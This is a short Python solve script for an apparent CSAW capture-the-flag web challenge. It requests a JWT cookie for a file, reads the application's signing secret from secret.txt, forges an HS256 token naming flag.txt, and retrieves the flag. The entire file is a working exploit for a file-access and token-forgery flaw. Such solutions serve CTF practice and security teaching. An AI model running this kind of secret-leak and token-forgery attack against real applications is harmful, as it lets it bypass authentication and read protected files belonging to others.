import requests
import jwt

LOCAL = True

if LOCAL:
    HOST="http://localhost"
    PORT="5000"
else:
    HOST="http://web.red.csaw.io"
    PORT=""

BASE_URL = HOST + ':' + PORT

def solve():
    s = requests.Session()

    # get access to secret file
    # this will set a cookie with a jwt allowing access
    s.post(BASE_URL, data={'filename': 'secret.txt'})

    # now that we have cookie, request the secret file and save secret
    resp = s.get(BASE_URL + '/secret.txt')
    secret = resp.text.strip()

    # use secret to make jwt for flag file
    token = jwt.encode({'filename': 'flag.txt'}, secret, algorithm='HS256')
    print(token.decode('utf-8'))

    # set our cookie and make request for flag
    s.cookies['jwt'] = token.decode('utf-8')
    resp = s.get(BASE_URL + '/flag.txt')
    flag = resp.text

    print(flag)


if __name__ == "__main__":
    solve()

